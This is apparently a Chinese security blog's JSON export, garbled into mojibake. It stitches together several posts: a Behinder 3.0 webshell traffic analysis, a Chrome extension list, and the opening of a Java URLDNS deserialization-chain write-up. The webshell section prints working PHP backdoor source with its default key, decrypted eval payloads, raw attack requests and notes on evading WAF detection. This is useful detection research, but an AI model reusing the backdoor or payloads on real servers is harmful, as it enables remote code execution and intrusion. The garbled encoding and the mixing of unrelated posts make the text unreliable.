1assert|eval(base64_decode(&#x27;QGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIG1haW4oJGNvbnRlbnQpDQp7DQoJJHJlc3VsdCA9IGFycmF5KCk7DQoJJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKCRjb250ZW50KTsNCiAgICAka2V5ID0gJF9TRVNTSU9OWydrJ107DQogICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCRrZXkpOw0KfQ0KDQpmdW5jdGlvbiBlbmNyeXB0KCRkYXRhLCRrZXkpDQp7DQoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICAJew0KICAgIAkJZm9yKCRpPTA7JGk8c3RybGVuKCRkYXRhKTskaSsrKSB7DQogICAgCQkJICRkYXRhWyRpXSA9ICRkYXRhWyRpXV4ka2V5WyRpKzEmMTVdOyANCiAgICAJCQl9DQoJCQlyZXR1cm4gJGRhdGE7DQogICAgCX0NCiAgICBlbHNlDQogICAgCXsNCiAgICAJCXJldHVybiBvcGVuc3NsX2VuY3J5cHQoJGRhdGEsICJBRVMxMjgiLCAka2V5KTsNCiAgICAJfQ0KfSRjb250ZW50PSI2MDc2YjhjMy04NTJiLTRkOGQtYjg0MS0xYzMxMDNhNWY5NTYiOw0KbWFpbigkY29udGVudCk7&#x27;)); è¯·æ±‚åŒ…base64 decode 12345678910111213141516171819202122232425@error_reporting(0);function main($content)&#123; $result = array(); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($content); $key = $_SESSION[&#x27;k&#x27;]; echo encrypt(json_encode($result),$key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&#x27;openssl&#x27;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;$content=&quot;6076b8c3-852b-4d8d-b841-1c3103a5f956&quot;;main($content); å“åº”åŒ…aesè§£å¯† 1&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;NjA3NmI4YzMtODUyYi00ZDhkLWI4NDEtMWMzMTAzYTVmOTU2&quot;&#125;\u000e\u000e\u000e\u000e\u000e\u000e\u000e\u000e\u000e\u000e\u000e\u000e\u000e\u000e ç°åœ¨å¾ˆå¤šå‚å•†å·²ç»å¯¹è¿”å›çš„å†…å®¹è¿›è¡ŒåŒ¹é…ã€‚æ‰€ä»¥è¿™ç§åŠ¨æ€åŠ å¯†çš„æ–¹å¼ä¼šåœ¨å†°è3å–æ¶ˆ ç¬¬å››æ¬¡POSTè¯·æ±‚ è¯·æ±‚ä½“è§£å¯†,phpinfo() 12345678910111213141516171819202122232425262728293031323334353637383940414243error_reporting(0);function main() &#123; ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); $driveList =&quot;&quot;; if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;)) &#123; for($i=65;$i&lt;=90;$i++) &#123; $drive=chr($i).&#x27;:/&#x27;; file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&#x27;&#x27;; &#125; &#125; else &#123; $driveList=&quot;/&quot;; &#125; $currentPath=getcwd(); //echo &quot;phpinfo=&quot;.$info.&quot;\\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\\n&quot;.&quot;driveList=&quot;.$driveList; $osInfo=PHP_OS; $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION[&#x27;k&#x27;]; //echo json_encode($result); //echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key); echo encrypt(json_encode($result), $key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&#x27;openssl&#x27;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;main(); å†°è3.0æµé‡åˆ†æåé—¨ä»£ç ä¸2.0ç‰ˆæœ¬ç›¸æ¯”å¯¹å¯†ç è¿›è¡Œäº†md5çš„åŠ å¯†ï¼Œå°‘äº†ä¸€ä¸ªå“åº”éšæœºç”Ÿæˆ16ä½å­—ç¬¦keyçš„åŠŸèƒ½ 1234567891011121314151617181920212223242526&lt;?php@error_reporting(0);session_start(); $key=&quot;e45e329feb5d925b&quot;; //è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond $_SESSION[&#x27;k&#x27;]=$key; session_write_close(); $post=file_get_contents(&quot;php://input&quot;); if(!extension_loaded(&#x27;openssl&#x27;)) &#123; $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) &#123; $post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else &#123; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); &#125; $arr=explode(&#x27;|&#x27;,$post); $func=$arr[0]; $params=$arr[1]; class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @call_user_func(new C(),$params);?&gt; wiresharkæŠ“åŒ…åˆ†æ æµé‡åˆ†æåˆ†ææµé‡å‘ç°ç›¸æ¯”2.0å°‘äº†åŠ¨æ€å¯†é’¥çš„è·å–çš„è¯·æ±‚ï¼Œaeså¯†é’¥å˜ä¸º md5(&quot;pass&quot;)[0:16] æ„æ€å°±æ˜¯ä¸º32ä½md5çš„å‰16ä½ã€‚å…¨ç¨‹ä¸å†äº¤äº’å¯†é’¥ç”Ÿæˆã€‚ä¸€å…±å°±ä¿©æ¬¡è¯·æ±‚ï¼Œç¬¬ä¸€æ¬¡è¯·æ±‚ä¸ºåˆ¤æ–­æ˜¯å¦å¯ä»¥å»ºç«‹è¿æ¥ï¼Œå°‘äº†ä¿©æ¬¡getè·å–å†°èåŠ¨æ€å¯†é’¥çš„è¡Œä¸ºï¼Œç¬¬äºŒæ¬¡å‘é€phpinfoç­‰ä»£ç æ‰§è¡Œï¼Œè·å–ç½‘ç«™çš„ä¿¡æ¯ã€‚ ç¬¬ä¸€æ¬¡POSTè¯·æ±‚ 1234567891011121314POST /shell.php HTTP/1.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Content-type: application/x-www-form-urlencodedReferer: http://127.0.0.1/A8.phpUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:79.0) Gecko/20100101 Firefox/79.0Cache-Control: no-cachePragma: no-cacheHost: 127.0.0.1Connection: keep-aliveContent-Length: 14323Mn1yNMtoZViV5wotQHPJtwwj0F4b2lyToNK7LfdUnN7zmyQFfx/zaiGwUHg+8SlXZemCLBkDIvxiBIGd6bgOEiZtNpn6YmnWiiaCBNbXkC5JWFTARrD8lCOCQ4ZVFjsJFDaAOwzinbqne/oYuNwWjQvKM9ii2RE/b+Gc+ya2f4+OIDU2Wk/QSIL7GOAoyaUYZSq4bL2wmX5RnP1Lbf7S+TAy3K7JPruBiZeZGC/ay14vUj4+IgmNHwEAzWl3DNIsL1yhH4Do5FI8HwZpG5XnrZwpKdFIEgN4GKmcDODTdO2pj8DVXCwes3m+v/wRykVd++xsex2EkGn9p0SgL+GpXlGg6OlQscedjdgBXv15UyPfJude5BJv+j7cEF7zpdtyAnFYCSqiRX+XD7DNsIUVbU+oamjVwZCgr4L+bbRvs1NfjV6iKKs65VTnlSIbCArJv/w+axR9Gc7Jt9v/GBKckbRjefZGqx7UTKDMahYEBgrwpXrii28q/UerEq/VKFKKeHQuovmpvlx8CblMBkG+rHmhQrP7QVJuzSOUbwdWZpbhys2bufqT6hyOjsu/0sSmHdrzvlZgkRsnsNK0Kv56sesEx9AiwuvgxMh5gAi86uAfhQISoEU5jZNs/T0LiJksv6xddHsDoKSwx+2s74jiNNFh9p0AmUdDloXXvRrfJvCdfaTHnkDEOH6BcSyZj9r53ZKiQUHPh7Sd13x/bk7zcKrUubSplf5cFLc+7m2nSWkXM1Ei7GVkZKBvKorowWkuS0katSgEt3WN00g95HyDfGdxZyUIthJ9hIETiP81O67weGqjFraZfXQUuOHNibydSrZTj/1La6OqSSHoAVnghH9TbYzM4lDdppSZJ1j5eWx8CVn+E8LeCyeROLhKix+P9yJh72FbLOoMFvCurzarkbYZrmQ7Qb0R1oOt2rKNFxY8/itqOSZdk/d2lFkZeT8sbzLmdMQBdSvP/WlvhRdgoYhdkYMfH+2YBJnLuuGgCaXJ0Ky0PpM6+076t6rbiQQQeZNXIMXEBI0Tj3HW3pUzfujkNq9eH0+MYndahOkMTmGSsloL4KLXxuzW2UHOd0giJV1LCFDyY+DlZ/h6mezAzXn7U8m+4uk+5hW3MlS1c3Z5seYa5YUvr/0fJlpswhcRNJCW8cqYNkrvhkx8qDodL6/3cjmjhqQPJEzJJGG6l0hF7vDByXs+2zE63uNlwhgrIDJgbiGOX3Ds6FaIiuCcQ/ZUtqA9W8sAQCdge6P+zJ1OoKVkNCpOhUb3e22MUXxtWH+1BdoR+S5aSN6NjcM4pKQrwXJ4xyV59kI9PUAjavw7DK+/Pf2wUFWCT2YVbObz+NLTxQ2r8QswTWp0kVLMSNIzOwbtWjUy+S9UAAPIVHPKmXRzplprChlH0wL9uCUO8L2htsaRM0Fpd7M8vrDyQ== è§£å¯†å 1234567891011121314151617181920212223242526272829303132assert|eval(base64_decode(&#x27;@error_reporting(0);function main($content)&#123; $result = array(); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($content); $key = $_SESSION[&#x27;k&#x27;]; echo encrypt(json_encode($result),$key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&#x27;openssl&#x27;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;$content=&quot;S3F0TTlUQjVsSkRGNnFlSHU2dEt0c0RzdzZlUWpWaUJobzRCMW9id0NlSzd2SzlEWFBaMENsSXpJVXh5aTFwMWxNa3VSd1k5YVJUQWZnNWkzS0JPQ3hsbWRpdGpHZkQ4dnlsMk9SenZ1T3hxZE5FOEVGaEs1TXF0S1hHcFZxSVIyeWJTY25weHZDWW93SnZ0&quot;;$content=base64_decode($content);main($content);// è§£å¯†ç¬¬ä¸€æ¬¡å‘é€çš„æ•°æ®æŸ¥çœ‹ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå‚æ•°ä¸º $content è¿™ä¸ªå˜é‡åç§°å’Œé‡Œé¢çš„å†…å®¹ä¸ºéšæœºç”Ÿæˆçš„ï¼Œ ç›®çš„æ˜¯ä¸ºäº†ç»•è¿‡ $Content-Length ï¼Œè¿™ä¸ªå·²ç»åœ¨å†°è2.0ä¸­å·²ç»è¢«åŠ å…¥äº†Wafçš„æ£€æµ‹è§„åˆ™å½“ä¸­ï¼Œæ‰€ä»¥åœ¨å†°è3.0å½“ä¸­ç”¨æ•°æ®å¡«å……çš„æ–¹å¼ç»•è¿‡ã€‚&#x27;));\u0001 1234567891011121314HTTP/1.1 200 OKDate: Thu, 08 Sep 2022 07:47:16 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02X-Powered-By: PHP/5.6.9Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheSet-Cookie: PHPSESSID=j39c0oi2abaghm0b8h5ab7pmj3; path=/Keep-Alive: timeout=5, max=100Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: text/html; charset=UTF-8mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j42REBdjeI0ap/e4pavYx6svt2i0v0ZERdkwhGaPZ/VBGvP1Cw29Ic+DnwBtTxWec7IuOA8jFdHrujhbw+4sln0433D5aFZLZUmEL6LuWpl2caVaTnmhPj7pWvWPGafD8CsHA1kTk/zy6s6ik5IMIWJkDVTI3vlb4zy2y5Qomp0RDOjsYaeRkwQerekW7A0sZcCm4suP8/BO3J/W6pOaBUhYUKjVIB/zsvKBsBgz1pMpUMBLFSU8B1RApobdh5rzEsKseQXvj4HKy+3HwF72AKQ å“¥æ–¯æ‹‰åé—¨ç¨‹åºæ€»ç»“AntSwordï¼š requests response base64ç­‰æ–¹å¼ æ˜æ–‡ å†°è2.0ï¼š requests response å¼€å¯Opensslæ‰©å±•-åŠ¨æ€å¯†é’¥aesåŠ å¯† aesåŠ å¯†+base64 æœªå¼€å¯Opensslæ‰©å±•-å¼‚æˆ– å¼‚æˆ–+base64 å†°è3.0ï¼š requests response å¼€å¯Opensslæ‰©å±•-é™æ€å¯†é’¥aesåŠ å¯† aesåŠ å¯†+base64 æœªå¼€å¯Opensslæ‰©å±•-å¼‚æˆ– å¼‚æˆ–+base64 å“¥æ–¯æ‹‰ï¼š requests response phpçš„ä¸ºbase64+å¼‚æˆ–+base64 å¼‚æˆ–+base64+è„å­—ç¬¦ jspçš„ä¸ºBase64+AES aes+base64+è„å­—ç¬¦ å‚è€ƒæ–‡ç« ","categories":[{"name":"çº¢è“æ”»é˜²","slug":"çº¢è“æ”»é˜²","permalink":"http://example.com/categories/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2/"},{"name":"webå®‰å…¨","slug":"çº¢è“æ”»é˜²/webå®‰å…¨","permalink":"http://example.com/categories/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æ”»é˜²","slug":"æ”»é˜²","permalink":"http://example.com/tags/%E6%94%BB%E9%98%B2/"},{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Arm U Chrome","slug":"arm u chrome","date":"2022-09-01T13:16:50.000Z","updated":"2022-09-01T07:18:17.993Z","comments":true,"path":"2022/09/01/arm u chrome/","link":"","permalink":"http://example.com/2022/09/01/arm%20u%20chrome/","excerpt":"","text":"Arm U Chromeæœ¬æ–‡æ•´ç†äº†ä¸ªäººå­¦ä¹ è¿‡ç¨‹ä¸­å‘ç°çš„ä¸€äº›æœ‰ç”¨çš„chromeæ’ä»¶ã€‚ chromeåº”ç”¨å•†åº— https://chrome.google.com/webstore/category/extensionsï¼Œéœ€~~ç§‘å­¦ä¸Šç½‘~~ Tampermonkeyã€æ²¹çŒ´ã€‘è¢«å„ç§æ•™è‚²ç½‘è¯¾æŠ˜ç£¨çš„å¤§å­¦ç”Ÿåº”è¯¥éƒ½çŸ¥é“è¿™ä¸ªæ’ä»¶å§ã€‚ å¯åœ¨æ’ä»¶å•†åº—å®‰è£…å„ç±»æ’ä»¶ï¼Œä»¥åŠå¯è‡ªå®šä¹‰ç¼–å†™è„šæœ¬ã€‚åˆ·ä¸ªè¯¾ç®€ç›´ä¸è¦å¤ªçˆ½ã€‚ è¿˜æœ‰å¤šç§å®ç”¨åŠŸèƒ½ç­‰å¾…æ¢ç´¢ google translateã€è°·æ­Œç¿»è¯‘ã€‘é˜…è¯»è‹±æ–‡èµ„æ–™ä¸è®¤è¯†å•è¯æ€ä¹ˆåŠï¼Œè¿™æ¬¾æ’ä»¶å¯å®æ—¶å¯¹æ‰€é€‰å†…å®¹è¿›è¡Œç¿»è¯‘ï¼Œä¸”ç•Œé¢ç®€ä»‹ã€‚ç¬”è€…å¯¹å¤šæ¬¾ç¿»è¯‘æ’ä»¶ä½¿ç”¨è¿‡åï¼Œå‘ç°ä¸æ˜¯ååº”é€Ÿåº¦æ…¢ï¼ˆå¦‚æœ‰é“è¯å…¸å­—å…¸çš„å–è¯ç¿»è¯‘ï¼‰ï¼Œè¦ä¹ˆå°±æ˜¯ç¿»è¯‘ç•Œé¢è‡ƒè‚¿ã€‚ Listen1ã€ç½‘é¡µå¬æ­Œã€‘åœ¨å±‹é¡¶å”±ç€ä½ çš„æ­Œ å®‰è£…Listen1æ’ä»¶ï¼Œå°±èƒ½æ”¶å¬å¤šä¸ªéŸ³ä¹å¹³å°çš„å…è´¹éŸ³ä¹ã€‚åŒæ—¶ï¼Œä½ è¿˜å¯ä»¥æœç´¢å¤šä¸ªå¹³å°çš„éŸ³ä¹å’Œæ­Œå•ï¼Œå¹¶ä¸”åˆ›é€ å±äºä½ è‡ªå·±çš„æ­Œå•å†…å®¹ã€‚ Copyfish ğŸŸ Free OCR Softwareã€æˆªå±å–è¯æ’ä»¶ã€‘ç½‘é¡µæ–‡å­—ä¸è®©å¤åˆ¶æ€ä¹ˆåŠï¼Ÿ ä»£ç ä¸ºå›¾ç‰‡å½¢å¼ä¸èƒ½ç²˜è´´æ€ä¹ˆåŠï¼Ÿ è¿™æ¬¾æ’ä»¶èƒ½å¤Ÿå¯¹æ‰€æˆªå–çš„å†…å®¹è¿›è¡Œé«˜æ•ˆçš„æ–‡æœ¬è¯†åˆ«ï¼Œå¦ˆå¦ˆå†ä¹Ÿä¸ç”¨æ‹…å¿ƒå¤åˆ¶ä¸äº†ä»£ç å•¦ï¼ˆäº‹å®è¯†åˆ«èƒ½åŠ›è¯æ˜è¿˜æ˜¯ä¸å¤ªè¡Œï¼Œå‡‘æ´»ç”¨å§ï¼‰ OneTabã€ä¸€é”®æ•´ç†æ ‡ç­¾é¡µï¼Œç¥å™¨å¢™æ¨ã€‘å†™ä»£ç é‡åˆ°è«åå…¶å¦™çš„é”™è¯¯ï¼ŒæŸ¥é˜…æ–‡æ¡£äº’ç›¸å¼•ç”¨ï¼Œå¤ç°æ¼æ´æ—¶çœ‹å„ç§æ–‡ç« ã€‚ ç›¸ä¿¡æ¯ä¸ªcoderéƒ½æœ‰è¿™æ ·çš„ç»å†ï¼Œæµè§ˆå™¨å¼€äº†ä¸€å †tabæ ‡ç­¾ä¹±å¦‚éº»å´ä¸çŸ¥æ‰€æªï¼Œæ­¤æ’ä»¶å¯ä»¥ä¸€é”®æ•´ç†tabæ ‡ç­¾ï¼Œå¹¶ä¸”å¯ä¿å­˜æ–¹ä¾¿ä¸‹æ¬¡ç›´æ¥æ‰“å¼€ã€‚ Quick QRã€äºŒç»´ç ç”Ÿæˆå™¨ã€‘ç”µè„‘çœ‹åˆ°äº†ä¸€æ®µæƒ…è¯æƒ³åˆ†äº«ç»™å¥³ç¥æ€ä¹ˆåŠï¼Œæ–‡ä»¶ä¼ è¾“åŠ©æ‰‹ï¼Ÿå¤ªlowäº†ã€‚è¿™æ¬¾æ’ä»¶èƒ½å¤Ÿå°†ä½ æ‰€è¾“å…¥çš„æ–‡æœ¬å†…å®¹è½¬åŒ–ä¸ºQR codeï¼Œåªéœ€æ‰‹æœºä¸€æ‰«å³å¯å¤åˆ¶ç²˜è´´ã€‚å†ä¹Ÿä¸æ€•å¥³ç¥éª‚ä½ ç›´ç”·å•¦ çŒ«æŠ“ã€è‡ªåŠ¨å—…æ¢èµ„æº+åª’ä½“æ§è¯‰ã€‘æ‰“å¼€ä¸€ä¸ªé¡µé¢ï¼Œä¹±ä¸ƒå…«ç³Ÿçš„èµ„æºè®©ä½ æ— å¤„ä¸‹æ‰‹ã€‚è¿™æ¬¾æ’ä»¶èƒ½å¤Ÿè‡ªåŠ¨å—…æ¢å½“å‰é¡µé¢å¯ä¸‹è½½çš„èµ„æºã€‚ä¸”å¯å¯¹è§†é¢‘è¿›è¡Œå€é€Ÿè°ƒæ•´ï¼Œå¯è‡ªå·±è®¾ç½®å¿«æ·é”®ã€‚æ°é¥­æ—¶çœ‹è§†é¢‘ï¼Œåˆ·ç½‘è¯¾16å€é€Ÿå†ä¹Ÿä¸æ˜¯æ¢¦ã€‚ FeHelperã€å‰ç«¯åŠ©æ‰‹ã€‘é›†æˆäº†å„ç§åœ¨çº¿å°å·¥å…·ï¼Œå†ä¹Ÿä¸ç”¨æ‰¾å„ç§åœ¨çº¿ç½‘ç«™äº† Enhanced GitHubã€åŠ å¼ºçš„githubã€‘githubçœ‹åˆ°ä¸ªå¥½ä¸œè¥¿ï¼Œä»€ä¹ˆï¼Œç«Ÿç„¶åªèƒ½æ•´ä¸ªä»“åº“ä¸€èµ·cloneï¼Œå¥½éº»çƒ¦ã€‚è¿™æ¬¾æ’ä»¶å¯ä»¥å¯¹å•ä¸ªæ–‡ä»¶è¿›è¡Œä¸‹è½½ã€‚ ublocked originã€ç½‘ç»œè¯·æ±‚è¿‡æ»¤å·¥å…·ã€‘ä¸€æ¬¾é«˜æ•ˆçš„ç½‘ç»œè¯·æ±‚è¿‡æ»¤å·¥å…·ï¼Œå ç”¨æä½çš„å†…å­˜å’Œ CPUã€‚ä¸€æ¬¾é«˜æ•ˆçš„è¯·æ±‚è¿‡æ»¤å·¥å…·ï¼šå ç”¨æä½çš„å†…å­˜å’ŒCPUï¼Œå’Œå…¶ä»–å¸¸è§çš„è¿‡æ»¤å·¥å…·ç›¸æ¯”ï¼Œå®ƒèƒ½å¤ŸåŠ è½½å¹¶æ‰§è¡Œä¸Šåƒæ¡è¿‡æ»¤è§„åˆ™ã€‚æ³¨æ„ä¸æ˜¯å¹¿å‘Šè¿‡æ»¤ markdown hereã€markdown emailã€‘å†™é‚®ä»¶è¿˜ç”¨æ‰‹åŠ¨æ’ç‰ˆï¼Ÿ ç”¨Markdownå†™ä¸€å°æ¼‚äº®çš„ç”µå­é‚®ä»¶ã€‚Markdown Hereå…è®¸ä½ åœ¨å‘é€ç”µå­é‚®ä»¶ä¹‹å‰ç”¨Markdownè¯­æ³•ç¼–è¾‘å¹¶è½¬æ¢å®ƒ(è®©å®ƒçœ‹èµ·æ¥æ¼‚äº®æäº†!)ã€‚ Speedtest by Ooklaã€ç½‘é¡µã€ç½‘ç»œæµ‹é€Ÿã€‘ç½‘é¡µæ‰“å¼€æ…¢ï¼Ÿå¿«æµ‹ä¸€æµ‹ä½ çš„ç½‘é€Ÿæ˜¯æ‹–æ‹‰æœºè¿˜æ˜¯é£æœº ç±»ä¼¼çš„ç½‘ç«™ã€å‘ç°ç±»ä¼¼ç½‘ç«™ã€‘å¿«é€Ÿæ¢æµ‹å’Œæœ¬ç½‘ç«™ç›¸ä¼¼çš„ç½‘ç«™ï¼Œå®ç°èµ„æºæ¨ªå‘ã€‚ï¼ˆä¸è¦å»porxhubå“¦ï¼‰ æ‹¿gayhubä¸¾ä¾‹ï¼Œèƒ½å¤Ÿæ¢æµ‹åˆ°ç›¸åŒç±»å‹çš„ç½‘ç«™ äº¬ä¸œæŠ¥ä»·åŠ©æ‰‹ã€å®æ—¶ç›‘æµ‹ä»·æ ¼ã€‘æ€•è¢«å¼ºå­è–…ç¾Šæ¯›ï¼Ÿä¸å¯èƒ½çš„ï¼Œæ­¤æ¬¾æ’ä»¶å¯å®æ—¶ç›‘æ§äº¬ä¸œä»·æ ¼ï¼Œä¸”å¯è‡ªåŠ¨ç”³è¯·ä»·ä¿æœåŠ¡ã€‚çœäº†ä¸€å—å°±æ˜¯èµšäº†ä¸€å—ã€‚ Wappalyzer - Technology profilerã€æ¢æµ‹ç½‘é¡µæ¡†æ¶ã€‘å¯è‡ªåŠ¨æ¢æµ‹ç½‘é¡µæ¡†æ¶æ„æˆã€‚æ¸—é€æµ‹è¯•æ—¶ä¹Ÿè®¸æœ‰ç”¨ WhatRunsã€åŒä¸Šã€‘åŒä¸Šï¼Œä½†è¿˜æ˜¯éœ€è¦è‡ªå·±ç‚¹ä¸€ä¸‹æ‰å¯ä»¥ã€‚ YouTubeâ„¢ åŒå­—å¹•ã€åŒè¯­å­—å¹•ï¼Œå­—å¹•ä¸‹è½½ï¼Œå­—å¹•é…éŸ³ã€‘è‹±è¯­çœ‹ä¸æ‡‚æ€ä¹ˆåŠï¼Ÿä¸çœ‹äº†ï¼Œyoutubeè‡ªå¸¦å­—å¹•åªå¯å®ç°è‹±æ–‡&#x2F;ä¸­æ–‡,æ­¤æ’ä»¶å¯å®ç°åŒå­—å¹•ï¼Œçœ‹ç‰‡çš„æ—¶å€™å­¦å­¦è‹±è¯­ä¹Ÿä¸æ˜¯ä¸å¯ä»¥ã€‚ Sourcegraphã€githubæœç´¢ç¥å™¨ã€‘å¯å®ç°å…³é”®å­—æœç´¢ï¼Œç”Ÿæˆä»£ç ç»“æ„å›¾ã€‚æ›´å¤šåŠŸèƒ½æ­£åœ¨æ¢ç´¢ã€‚ GitHub-Web-IDEã€webç«¯vscodeã€‘å¦‚ä½•ä¼˜é›…çš„æŸ¥çœ‹githubä»“åº“ æ‰©å±•ç®¡ç†å™¨ã€ç®¡ç†æ’ä»¶ã€‘å®‰è£…ä¸Šè¿°æ’ä»¶åï¼Œä½ çš„å›ºå®šæ æ˜¯ä¸æ˜¯è¿™æ · è¿™æ¬¾æ’ä»¶å¯æ”¶èµ·å›ºå®šæ ã€‚ä¼˜é›…ã€‚ æ›´å¤šå†…å®¹ç­‰å¾…æ¢ç´¢","categories":[{"name":"é»‘ç§‘æŠ€","slug":"é»‘ç§‘æŠ€","permalink":"http://example.com/categories/%E9%BB%91%E7%A7%91%E6%8A%80/"}],"tags":[{"name":"é»‘ç§‘æŠ€","slug":"é»‘ç§‘æŠ€","permalink":"http://example.com/tags/%E9%BB%91%E7%A7%91%E6%8A%80/"}]},{"title":"URLDNSé“¾","slug":"urldns","date":"2022-08-11T13:16:50.000Z","updated":"2022-09-01T01:28:22.122Z","comments":true,"path":"2022/08/11/urldns/","link":"","permalink":"http://example.com/2022/08/11/urldns/","excerpt":"","text":"URLDNSé“¾ æ¦‚è¿° URLDNS å°±æ˜¯ysoserialä¸­ä¸€ä¸ªï§ç”¨é“¾çš„åå­—ï¼Œä½†å‡†ç¡®æ¥è¯´ï¼Œè¿™ä¸ªå…¶å®ï¥§èƒ½ç§°ä½œâ€œï§ç”¨é“¾â€ã€‚å› ä¸ºå…¶å‚æ•°ä¸ï¥§æ˜¯ä¸€ä¸ªå¯ä»¥â€œï§ç”¨â€çš„å‘½ä»¤ï¼Œè€Œä»…ä¸ºä¸€ä¸ªURLï¼Œå…¶èƒ½è§¦å‘çš„ç»“æœä¹Ÿï¥§æ˜¯å‘½ä»¤æ‰§ï¨ˆï¼Œè€Œæ˜¯ä¸€æ¬¡DNSè¯·æ±‚ã€‚ è™½ç„¶è¿™ä¸ªâ€œï§ç”¨é“¾â€å®é™…ä¸Šæ˜¯ï¥§èƒ½â€œï§ç”¨â€çš„ï¼Œä½†å› ä¸ºå…¶å¦‚ä¸‹çš„ä¼˜ç‚¹ï¼Œéå¸¸é€‚åˆæˆ‘ä»¬åœ¨æ£€æµ‹ååºåˆ—åŒ–ï¥ï¨…æ—¶ä½¿ç”¨ï¼š ä½¿ç”¨Javaå†…ç½®çš„ç±»æ„é€ ï¼Œå¯¹ç¬¬ä¸‰æ–¹åº“æ²¡æœ‰ä¾èµ– åœ¨ç›®æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºï¦œåŒ–ï¥ï¨… åˆ©ç”¨é“¾ 12345* Gadget Chain:* HashMap.readObject()* HashMap.putVal()* HashMap.hash()* URL.hashCode() HashMapåº•å±‚åŸç† HashMapæ˜¯Mapçš„ä¸€ä¸ªå®ç°ç±»ï¼Œä»¥æ•°ç»„+(é“¾è¡¨æˆ–çº¢é»‘æ ‘)å®ç°ã€‚å®ƒæ˜¯ä»¥é”®å€¼å¯¹å­˜å‚¨æ•°æ®çš„ï¼ŒKey-Valueéƒ½æ˜¯Map.Entryä¸­çš„å±æ€§ åœ¨å®ä¾‹åŒ–ä»¥åï¼Œåº•å±‚åˆ›å»ºäº†é•¿åº¦æ˜¯16çš„ä¸€ç»´æ•°ç»„Entry[] table,å…¶ä¸­æ¯ä¸ªèŠ‚ç‚¹ç”¨Nodeè¡¨ç¤º 123456Node(int hash, K key, V value, Node&lt;K,V&gt; next) &#123; this.hash = hash; this.key = key; this.value = value; this.next = next; &#125; å½“putä¸€ä¸ªé”®å€¼å¯¹æ—¶ï¼Œé¦–å…ˆå¯¹keyè¿›è¡Œhashï¼Œå…¶ä¸­hashä¸­åˆè°ƒç”¨hashcodeæ–¹æ³•ï¼Œä¹‹åæ·»åŠ tabæ•°ç»„ä¸­æ·»åŠ node,æºç å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true); &#125; static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125; final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null); else &#123; Node&lt;K,V&gt; e; K k; 